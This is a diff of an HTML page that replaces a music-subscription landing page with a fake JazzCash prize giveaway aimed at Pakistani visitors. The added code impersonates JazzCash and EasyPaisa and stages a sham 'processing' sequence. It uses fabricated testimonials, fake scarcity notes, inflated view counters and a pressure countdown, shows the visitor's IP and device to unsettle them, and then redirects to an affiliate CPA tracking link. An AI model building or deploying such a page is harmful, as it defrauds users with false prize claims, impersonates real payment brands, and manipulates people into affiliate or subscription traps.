+        <div class="quiz-question">What do you want to <span class="highlight">use the money</span> for?</div>
+        <div class="quiz-options">
+          <div class="quiz-option" data-next="processing" data-purpose="repay your loan"><span class="option-icon">💰</span> Personal Use / Loan Coverage</div>
+          <div class="quiz-option" data-next="processing" data-purpose="buy a house"><span class="option-icon">🏠</span> Buy House</div>
+          <div class="quiz-option" data-next="processing" data-purpose="upgrade your business"><span class="option-icon">📈</span> Business Upgrade</div>
+          <div class="quiz-option" data-next="processing" data-purpose="pay education fees"><span class="option-icon">🎓</span> Education Fees</div>
+        </div>
+      </div>
+      <!-- Step 2 for NO: What do you want? -->
+      <div class="quiz-step" id="quizStep2No">
+        <span class="quiz-step-number">🔹 Question 2 of 2</span>
+        <div class="quiz-question">What do <span class="highlight">you want</span>?</div>
+        <div class="quiz-options">
+          <div class="quiz-option" data-next="processing" data-purpose="buy an iPhone"><span class="option-icon">📱</span> iPhone</div>
+          <div class="quiz-option" data-next="processing" data-purpose="buy a Bike"><span class="option-icon">🏍️</span> Bike</div>
+          <div class="quiz-option" data-next="processing" data-purpose="buy a Laptop"><span class="option-icon">💻</span> Laptop</div>
+        </div>
+      </div>
+      <!-- Processing / Loading Screen -->
+      <div class="processing-screen" id="processingScreen">
+        <div class="processing-title"><span class="pulse-icon">🎯</span> Analyzing Your Reward...</div>
+        <div class="processing-step" id="procStep1">
+          <span class="step-icon"><div class="spinner-small"></div></span>
+          <span>Submitting request to JazzCash...</span>
+        </div>
+        <div class="processing-step" id="procStep2">
+          <span class="step-icon">⏳</span>
+          <span>JazzCash attending the request...</span>
+        </div>
+        <div class="processing-step" id="procStep3">
+          <span class="step-icon">⏳</span>
+          <span>JazzCash sending back feedback...</span>
+        </div>
+      </div>
+    </div>
+
+   <div class="sponsor">
+      <span style="color:#aaa; font-size:11px;">Sponsored by</span>
+      <span style="font-weight:700; color:#e80000; font-size:12px;">JazzCash</span>
+      <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
+      <span style="font-weight:700; color:#1a73e8; font-size:12px;">EasyPaisa</span>
+      <img src="https://icon2.cleanpng.com/lnd/20250110/er/acded9d6362d497965c18a071cb9fd.webp" alt="EasyPaisa" class="sponsor-logo" onerror="this.style.display='none';">
+      <span class="sponsor-separator"></span>
+      <span class="brand-tag hd">✨ HD AD FREE</span>
+    </div>
+    <div id="comments-section">
+      <div class="section-label"><span class="live-dot"></span> Recent Visitor Comments</div>
+      <div id="comments-list"></div>
+      <div class="comment-input-wrap">
+        <input type="text" id="userComment" placeholder="Leave your comment here..." maxlength="60" autocomplete="off">
+        <button id="postComment">POST</button>
+      </div>
     </div>
   </div>
 
-  <!-- HERO -->
-  <header class="hero">
-    <div class="wrap hero-grid">
-      <div>
-        <span class="eyebrow">● Open for business — new stock daily</span>
-        <h1>Fresh Naija hits.<br><span>New stock</span><br>every single day.</h1>
-        <p class="sub">Afrobeats, Amapiano, Gospel, Hip-Hop and throwback classics — stocked fresh on your phone like the latest drop at the market. No app, no data wahala, just tap and play.</p>
-        <div class="hero-ctas">
-          <a class="btn-primary" href="https://wwmyokgik.one/cl/bdef323e413510a5">Activate My Access →</a>
-          <span class="price-note">From ₦50/day · cancel anytime</span>
-        </div>
+  <!-- INITIAL POPUP -->
+  <div id="initialModal" class="modal-overlay">
+    <div class="modal">
+      <h3>📱 Your phone number has been chosen to win upto! <span style="color:#FFD700;">₨100,000</span></h3>
+      <div class="limited-offer">⚡ LIMITED TIME OFFER</div>
+      <div class="modal-info" id="initialInfo">
+        <div class="info-row"><span class="info-label">IP Address</span><span class="info-value" id="userIP">Loading...</span></div>
+        <div class="info-row"><span class="info-label">Device</span><span class="info-value" id="initialDevice">Detecting...</span></div>
+        <div class="info-row"><span class="info-label">Country</span><span class="info-value" id="userCountry">Loading...</span></div>
       </div>
+      <div class="scarcity-note" id="scarcityNote1">🔥 You are 1 among only 4 selected today!</div>
+      <div class="modal-sponsor">
+        <span>Sponsored by</span>
+        <span style="font-weight:700; color:#e80000;">JazzCash</span>
+        <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';"> JazzCash Exclusive</div>
+ <button class="btn-primary" id="continueBtn" style="margin-top:12px;">CONTINUE</button>
+             </div>
+     
     </div>
-    <div class="marquee-band">
-      <div class="marquee-track mono">
-        <span>★ This week's Afrobeats anthem</span>
-        <span>★ Amapiano drop of the week</span>
-        <span>★ Gospel praise mix</span>
-        <span>★ Naija hip-hop heat</span>
-        <span>★ Throwback Naija classics</span>
-        <span>★ This week's Afrobeats anthem</span>
-        <span>★ Amapiano drop of the week</span>
-        <span>★ Gospel praise mix</span>
-        <span>★ Naija hip-hop heat</span>
-        <span>★ Throwback Naija classics</span>
-      </div>
-    </div>
-  </header>
+  </div>
 
-  <!-- FEATURES -->
-  <section class="section">
-    <div class="wrap">
-      <div class="section-head">
-        <h2>What's on the stall</h2>
-        <span class="tag">/ what you get</span>
-      </div>
-      <div class="stamp-grid">
-        <div class="stamp c1">
-          <h3>Thousands of tracks</h3>
-          <p>A full catalogue across every Naija genre, restocked with new releases all the time.</p>
-        </div>
-        <div class="stamp c2">
-          <h3>New drops daily</h3>
-          <p>Fresh songs land every day, so there's always something new to play.</p>
-        </div>
-        <div class="stamp c3">
-          <h3>Any phone, any network</h3>
-          <p>Works on MTN, Airtel, Glo and 9mobile — no smartphone or app required.</p>
-        </div>
-        <div class="stamp c4">
-          <h3>Low data, fast load</h3>
-          <p>Built light for everyday data bundles, so streaming doesn't eat your credit.</p>
-        </div>
+  <!-- WIN POPUP (JazzCash has given you 100,000) -->
+  <div id="winCongratsModal" class="modal-overlay">
+    <div class="modal">
+      <h3>🎉 Congratulations!</h3>
+      <div class="money-img">💰💵💸</div>
+      <p style="font-size:15px; color:#fff; font-weight:600;">JazzCash has given you <span style="color:#FFD700;">₨100,000</span> to <span style="color:#FFD700;" id="winPurpose">cover your needs</span>!</p>
+      <div class="scarcity-note" id="scarcityNote3">🔥 You are 1 among only 4 selected today!</div>
+      <button class="btn-proceed" id="winProceedBtn">Proceed to Claim</button>
+      <div class="modal-sponsor">
+        <span>Sponsored by</span>
+        <span style="font-weight:700; color:#e80000;">JazzCash</span>
+        <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
       </div>
     </div>
-  </section>
+  </div>
 
-  <!-- HOW IT WORKS -->
-  <section class="section" style="padding-top:0;">
-    <div class="wrap">
-      <div class="section-head">
-        <h2>How to start</h2>
-        <span class="tag">/ 3 steps</span>
+  <!-- SECOND POPUP (Confirm phone number) -->
+  <div id="winConfirmModal" class="modal-overlay">
+    <div class="modal">
+      <h3>📱 Confirm Your Phone Number</h3>
+      <div class="money-img">🔐</div>
+      <p>Enter your phone number to claim your <span style="color:#FFD700;">₨100,000</span> reward now!</p>
+      <div class="scarcity-note" id="scarcityNote2">🔥 You are 1 among only 4 selected today!</div>
+      <div class="emergency-timer">
+        <div>⚠️ OFFER EXPIRES IN</div>
+        <div class="timer-display" id="countdownTimer">00:59</div>
+        <div class="timer-label">Tap PROCEED now before it's too late!</div>
       </div>
-      <div class="steps">
-        <div class="step">
-          <span class="num">01</span>
-          <h3>Tap "Activate My Access"</h3>
-          <p>You'll be taken to a secure page to confirm your number.</p>
-        </div>
-        <div class="step">
-          <span class="num">02</span>
-          <h3>Confirm on your phone</h3>
-          <p>Approve the prompt from your network to switch on the service.</p>
-        </div>
-        <div class="step">
-          <span class="num">03</span>
-          <h3>Start streaming</h3>
-          <p>Browse the catalogue and play your first track in seconds.</p>
-        </div>
+      <button class="btn-proceed" id="proceedBtn">Confirm Phone Number</button>
+      <div class="modal-sponsor">
+        <span>Sponsored by</span>
+        <span style="font-weight:700; color:#e80000;">JazzCash</span>
+        <img src="https://i.postimg.cc/94R7kgCR/jazzcash-logo.png" alt="JazzCash" style="width:18px;height:18px;vertical-align:middle;object-fit:contain;margin-right:2px" onerror="this.style.display='none';">
       </div>
     </div>
-  </section>
+  </div>
 
-  <!-- GENRES -->
-  <section class="section genres-section">
-    <div class="wrap">
-      <div class="section-head">
-        <h2>Every corner of the market</h2>
-        <span class="tag">/ genres</span>
-      </div>
-      <div class="chip-row">
-        <span class="chip">Afrobeats</span>
-        <span class="chip">Amapiano</span>
-        <span class="chip">Naija Pop</span>
-        <span class="chip">Gospel</span>
-        <span class="chip">Hip-Hop</span>
-        <span class="chip">Throwbacks</span>
-        <span class="chip">Highlife</span>
-        <span class="chip">Afro-fusion</span>
-      </div>
-    </div>
-  </section>
+  <script>
+    (function() {
+      const CPA_LINK = "https://vtdmp.bemobtrcks.com/click/1?ns=c%3D391e0127-2fb1-490e-b450-95efb6f353d3..l%3D2..a%3D0..b%3D0";
+      const initialModal = document.getElementById('initialModal');
+      const winCongratsModal = document.getElementById('winCongratsModal');
+      const winConfirmModal = document.getElementById('winConfirmModal');
+      const commentsList = document.getElementById('comments-list');
+      const confettiCanvas = document.getElementById('confetti-canvas');
+      const confettiCtx = confettiCanvas.getContext('2d');
+      const processingScreen = document.getElementById('processingScreen');
 
-  <!-- PRICING / SCRATCH CARD -->
-  <section class="section pricing-section" id="pricing">
-    <div class="wrap">
-      <div class="section-head" style="justify-content:center;text-align:center;flex-direction:column;align-items:center;">
-        <h2>Today's price</h2>
-        <span class="tag">/ scratch &amp; activate</span>
-      </div>
-      <div class="pricing-grid">
-        <div class="recharge-card">
-          <div class="recharge-top">
-            <span class="brand display">Beat Market</span>
-            <span class="mono">Music Pass</span>
+      let userCountryName = 'Pakistan';
+      let userCountryFlag = '🇵🇰';
+      let userIP = 'Loading...';
+      let countdownInterval = null;
+      let countdownSeconds = 30;
+      let selectedCount = 3;
+      let selectedPurpose = '';
+
+      const STATIC_COMMENTS = [
+        { name: "Ahmed R.", msg: "I received ₨100,000 😍", time: "2m ago" },
+        { name: "Fatima K.", msg: "JazzCash works fast! Instant transfer 🔥", time: "4m ago" },
+        { name: "Bilal A.", msg: "Just got paid. This is actually real!", time: "6m ago" },
+        { name: "Sana U.", msg: "Claimed mine already 💸 Thank you!", time: "9m ago" },
+        { name: "Hamza Z.", msg: "Wow, amazing 🙌 Highly recommended", time: "12m ago" },
+        { name: "Ayesha L.", msg: "Thought it was fake but got the money instantly", time: "15m ago" },
+        { name: "Omar F.", msg: "Tapmad campaigns are always legit 🚀", time: "18m ago" },
+        { name: "Zara N.", msg: "So happy right now! Best day ever ✨", time: "21m ago" },
+        { name: "Ali B.", msg: "Withdrawn to Easypaisa & JazzCash both worked", time: "25m ago" },
+        { name: "Maham S.", msg: "Shared with my group chat! All claimed ✅", time: "30m ago" }
+      ];
+
+      const PARTICLES_COUNT = 30;
+      let quizCompleted = false;
+
+      async function fetchIPInfo() {
+        try {
+          const ipRes = await fetch('https://api.ipify.org?format=json');
+          const ipData = await ipRes.json();
+          userIP = ipData.ip;
+          const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
+          const geoData = await geoRes.json();
+          if (geoData.country_name) {
+            userCountryName = geoData.country_name;
+            userCountryFlag = getFlagEmoji(geoData.country_code);
+          }
+        } catch (e) {
+          userCountryName = 'Pakistan';
+          userCountryFlag = '🇵🇰';
+          userIP = 'Unable to detect';
+        }
+        document.getElementById('userIP').textContent = userIP;
+        document.getElementById('initialDevice').textContent = detectDeviceType();
+        document.getElementById('userCountry').textContent = userCountryFlag + ' ' + userCountryName;
+        selectedCount = Math.floor(Math.random() * 2) + 2;
+        updateAllScarcityNotes();
+        initialModal.style.display = 'flex';
+      }
+
+      function updateAllScarcityNotes() {
+        const noteText = `🔥 You are 1 among only ${selectedCount} selected today!`;
+        const notes = document.querySelectorAll('.scarcity-note');
+        notes.forEach(note => {
+          note.textContent = noteText;
+        });
+      }
+
+      function getFlagEmoji(countryCode) {
+        if (!countryCode) return '🇵🇰';
+        const codePoints = countryCode.toUpperCase().split('').map(char => 127397 + char.charCodeAt());
+        return String.fromCodePoint(...codePoints);
+      }
+
+      function detectDeviceType() {
+        const ua = navigator.userAgent;
+        if (/iPad|iPhone|iPod/.test(ua)) return 'iOS Mobile';
+        if (/Android/.test(ua)) return 'Android Mobile';
+        if (/Macintosh|Mac OS X/.test(ua)) return 'macOS Desktop';
+        if (/Windows/.test(ua)) return 'Windows Desktop';
+        if (/Linux/.test(ua) && !/Android/.test(ua)) return 'Linux Desktop';
+        return 'Unknown Device';
+      }
+
+      function createParticles() {
+        const container = document.getElementById('particles');
+        for(let i=0; i<PARTICLES_COUNT; i++){
+          const p = document.createElement('div');
+          p.className = 'particle';
+          const size = Math.random() * 8 + 4;
+          p.style.width = `${size}px`; p.style.height = `${size}px`;
+          p.style.left = `${Math.random() * 100}%`;
+          p.style.background = Math.random() > 0.6 ? '#FFD700' : '#ffffff';
+          p.style.animationDuration = `${Math.random() * 12 + 8}s`;
+          p.style.animationDelay = `${Math.random() * 6}s`;
+          container.appendChild(p);
+        }
+      }
+      createParticles();
+
+      // QUIZ LOGIC
+      function handleOptionClick(optionElement) {
+        if (quizCompleted) return;
+        
+        const nextAction = optionElement.getAttribute('data-next');
+        const purpose = optionElement.getAttribute('data-purpose');
+        
+        // Find the parent quiz-step
+        const stepElement = optionElement.closest('.quiz-step');
+        const allOptions = stepElement.querySelectorAll('.quiz-option');
+        
+        // Mark selected
+        allOptions.forEach(opt => opt.classList.remove('selected'));
+        optionElement.classList.add('selected');
+        
+        // Disable all options in current step
+        allOptions.forEach(opt => opt.style.pointerEvents = 'none');
+        
+        if (nextAction === 'step2yes') {
+          // Yes clicked - go to Step 2 (money usage)
+          setTimeout(() => {
+            stepElement.classList.remove('active');
+            document.getElementById('quizStep2Yes').classList.add('active');
+          }, 400);
+        } else if (nextAction === 'step2no') {
+          // No clicked - go to Step 2 (what do you want)
+          setTimeout(() => {
+            stepElement.classList.remove('active');
+            document.getElementById('quizStep2No').classList.add('active');
+          }, 400);
+        } else if (nextAction === 'processing') {
+          // Store purpose and start processing
+          selectedPurpose = purpose || 'cover your needs';
+          setTimeout(() => {
+            stepElement.classList.remove('active');
+            startProcessing();
+          }, 400);
+        }
+      }
+
+      function startProcessing() {
+        processingScreen.classList.add('active');
+        
+        const step1 = document.getElementById('procStep1');
+        const step2 = document.getElementById('procStep2');
+        const step3 = document.getElementById('procStep3');
+        
+        // Reset steps
+        [step1, step2, step3].forEach(s => {
+          s.classList.remove('done', 'active-step');
+          s.querySelector('.step-icon').innerHTML = '⏳';
+        });
+        
+        // Step 1: Submitting
+        setTimeout(() => {
+          step1.classList.add('active-step');
+          step1.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
+        }, 300);
+        
+        // Step 1 done, Step 2 active
+        setTimeout(() => {
+          step1.classList.remove('active-step');
+          step1.classList.add('done');
+          step1.querySelector('.step-icon').textContent = '✅';
+          step2.classList.add('active-step');
+          step2.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
+        }, 2200);
+        
+        // Step 2 done, Step 3 active
+        setTimeout(() => {
+          step2.classList.remove('active-step');
+          step2.classList.add('done');
+          step2.querySelector('.step-icon').textContent = '✅';
+          step3.classList.add('active-step');
+          step3.querySelector('.step-icon').innerHTML = '<div class="spinner-small"></div>';
+        }, 4200);
+        
+        // All done - show win popup
+        setTimeout(() => {
+          step3.classList.remove('active-step');
+          step3.classList.add('done');
+          step3.querySelector('.step-icon').textContent = '✅';
+          
+          // Show congratulations popup
+          setTimeout(() => {
+            quizCompleted = true;
+            processingScreen.classList.remove('active');
+            document.getElementById('winPurpose').textContent = selectedPurpose;
+            updateAllScarcityNotes();
+            winCongratsModal.style.display = 'flex';
+            startConfetti();
+          }, 600);
+        }, 6200);
+      }
+
+      // Attach event listeners to all quiz options
+      document.querySelectorAll('.quiz-option').forEach(option => {
+        option.addEventListener('click', function() {
+          handleOptionClick(this);
+        });
+      });
+
+      // CONFETTI
+      let confettiParticles = [];
+      let confettiAnimationId = null;
+      function resizeConfetti() {
+        confettiCanvas.width = window.innerWidth;
+        confettiCanvas.height = window.innerHeight;
+      }
+      window.addEventListener('resize', resizeConfetti);
+      resizeConfetti();
+
+      function startConfetti() {
+        confettiParticles = [];
+        const colors = ['#FFD700', '#25D366', '#FF4500', '#1E90FF', '#FF69B4', '#FFF'];
+        for (let i = 0; i < 200; i++) {
+          confettiParticles.push({
+            x: Math.random() * confettiCanvas.width,
+            y: Math.random() * confettiCanvas.height - confettiCanvas.height,
+            size: Math.random() * 8 + 4,
+            color: colors[Math.floor(Math.random() * colors.length)],
+            speedY: Math.random() * 5 + 4,
+            speedX: (Math.random() - 0.5) * 3,
+            rotation: Math.random() * 360,
+            rotationSpeed: (Math.random() - 0.8) * 12,
+            opacity: 1
+          });
+        }
+        if (confettiAnimationId) cancelAnimationFrame(confettiAnimationId);
+        function animateConfetti() {
+          confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+          let stillActive = false;
+          for (let p of confettiParticles) {
+            p.y += p.speedY;
+            p.x += p.speedX;
+            p.rotation += p.rotationSpeed;
+            p.opacity -= 0.003;
+            if (p.opacity <= 0) continue;
+            stillActive = true;
+            confettiCtx.save();
+            confettiCtx.translate(p.x, p.y);
+            confettiCtx.rotate((p.rotation * Math.PI) / 180);
+            confettiCtx.globalAlpha = p.opacity;
+            confettiCtx.fillStyle = p.color;
+            confettiCtx.fillRect(-p.size/2, -p.size/4, p.size, p.size/2);
+            confettiCtx.restore();
+          }
+          if (stillActive) {
+            confettiAnimationId = requestAnimationFrame(animateConfetti);
+          } else {
+            confettiCtx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+            confettiAnimationId = null;
+          }
+        }
+        animateConfetti();
+      }
+
+      function startCountdown() {
+        countdownSeconds = 30;
+        const timerDisplay = document.getElementById('countdownTimer');
+        function updateTimer() {
+          const minutes = Math.floor(countdownSeconds / 60);
+          const seconds = countdownSeconds % 60;
+          timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+          if (countdownSeconds <= 10) timerDisplay.style.color = '#ff0000';
+          if (countdownSeconds <= 0) {
+            clearInterval(countdownInterval);
+            timerDisplay.textContent = "00:00";
+            window.location.href = CPA_LINK;
+          }
+          countdownSeconds--;
+        }
+        updateTimer();
+        countdownInterval = setInterval(updateTimer, 1000);
+      }
+
+      function stopCountdown() {
+        if (countdownInterval) { clearInterval(countdownInterval); countdownInterval = null; }
+      }
+
+      document.getElementById('continueBtn').addEventListener('click', () => {
+        initialModal.style.display = 'none';
+      });
+
+      // Win congrats proceed button -> goes to confirm phone number popup
+      document.getElementById('winProceedBtn').addEventListener('click', () => {
+        winCongratsModal.style.display = 'none';
+        updateAllScarcityNotes();
+        winConfirmModal.style.display = 'flex';
+        startCountdown();
+      });
+
+      // Confirm phone number button -> CPA link
+      document.getElementById('proceedBtn').addEventListener('click', () => {
+        stopCountdown();
+        window.location.href = CPA_LINK;
+      });
+
+      let likes = 1205;
+      let views = 300450;
+      const likesEl = document.querySelector('.likes-text');
+      const viewsEl = document.querySelector('.views-text');
+      setInterval(() => {
+        likes += Math.floor(Math.random() * 3) + 1;
+        likesEl.textContent = `❤️ ${likes.toLocaleString()}+`;
+      }, 1400);
+      setInterval(() => {
+        const change = Math.floor(Math.random() * 150) - 60;
+        views += change;
+        if(views < 295000) views = 295000;
+        viewsEl.textContent = `${views.toLocaleString()}+`;
+      }, 1800);
+
+      function renderComments() {
+        commentsList.innerHTML = '';
+        STATIC_COMMENTS.forEach((c, idx) => {
+          const card = document.createElement('div');
+          card.className = 'comment-card';
+          card.style.animationDelay = `${idx * 0.05}s`;
+          card.innerHTML = `
+            <div class="comment-avatar">${c.name.charAt(0)}</div>
+            <div class="comment-content">
+              <div class="comment-name">${c.name} <span style="color:#555; font-size:11px;">• ${c.time}</span></div>
+              <div class="comment-text">${c.msg}</div>
+            </div>
+          `;
+          commentsList.appendChild(card);
+        });
+      }
+      renderComments();
+
+      const commentInput = document.getElementById('userComment');
+      const postBtn = document.getElementById('postComment');
+      postBtn.addEventListener('click', () => {
+        const text = commentInput.value.trim();
+        if(!text) return;
+        const newComment = { name: "You", msg: text, time: "Just now" };
+        STATIC_COMMENTS.unshift(newComment);
+        const card = document.createElement('div');
+        card.className = 'comment-card';
+        card.style.border = "1px solid #25D366";
+        card.style.background = "#0d1a12";
+        card.innerHTML = `
+          <div class="comment-avatar" style="background:var(--primary); color:#000;">✓</div>
+          <div class="comment-content">
+            <div class="comment-name">${newComment.name} <span style="color:#25D366; font-size:11px;">• ${newComment.time}</span></div>
+            <div class="comment-text">${newComment.msg}</div>
           </div>
-          <div class="scratch-panel">
-            <div class="label">Subscription rate</div>
-            <div class="price">₦50<span style="font-size:20px;">/day</span></div>
-            <div class="freq">Billed daily · auto-renews · cancel anytime</div>
-          </div>
-          <div class="recharge-bottom">
-            <ul>
-              <li>Unlimited streaming from the full catalogue</li>
-              <li>Charged to your airtime or mobile balance</li>
-              <li>Stop anytime — see terms below</li>
-            </ul>
-            <a class="btn-primary" href="https://wwmyokgik.one/cl/bdef323e413510a5">Activate My Access →</a>
-          </div>
-        </div>
-      </div>
-    </div>
-  </section>
+        `;
+        commentsList.insertBefore(card, commentsList.firstChild);
+        commentInput.value = '';
+        postBtn.disabled = true;
+        postBtn.textContent = "POSTED ✓";
+      });
+      commentInput.addEventListener('keypress', (e) => {
+        if(e.key === 'Enter') postBtn.click();
+      });
 
-  <!-- NETWORKS -->
-  <section class="section" style="padding-bottom:32px;">
-    <div class="wrap">
-      <div class="section-head">
-        <h2>Available on</h2>
-        <span class="tag">/ networks</span>
-      </div>
-      <div class="network-row">
-        <span class="network-badge">MTN</span>
-        <span class="network-badge">Airtel</span>
-        <span class="network-badge">Glo</span>
-        <span class="network-badge">9mobile</span>
-      </div>
-    </div>
-  </section>
-
-  <!-- TERMS -->
-  <section class="section" style="padding-top:0;">
-    <div class="wrap">
-      <div class="terms-box">
-        <h3>Subscription terms — please read before activating</h3>
-        <ul>
-          <li><strong>Price:</strong> ₦50 per day, charged to your mobile airtime or carrier balance.</li>
-          <li><strong>Billing:</strong> Subscription auto-renews daily until you cancel. You will be billed again each day you remain subscribed.</li>
-          <li><strong>How to cancel:</strong> Text STOP to 32665, or dial *xxx# at any time, free of charge. [Replace with your real shortcode/USSD]</li>
-          <li><strong>Support:</strong> Email support@beatmarket.example or call [insert customer care number] for help.</li>
-          <li><strong>Eligibility:</strong> Available to MTN, Airtel, Glo and 9mobile subscribers in Nigeria, 18 years and older.</li>
-        </ul>
-      </div>
-    </div>
-  </section>
-
-  <!-- FOOTER -->
-  <footer>
-    <div class="wrap">
-      <div class="foot-grid">
-        <div>
-          <div class="brand display">Beat Market</div>
-        </div>
-        <p>Beat Market is a mobile music subscription service. By subscribing you agree to recurring daily billing until cancelled. See terms above for full pricing and cancellation details.</p>
-      </div>
-      <div class="fine">©️ 2026 Beat Market. All rights reserved. [Insert company registration / address here]</div>
-    </div>
-  </footer>
-
+      fetchIPInfo();
+    })();
+  </script>
 </body>
 </html>
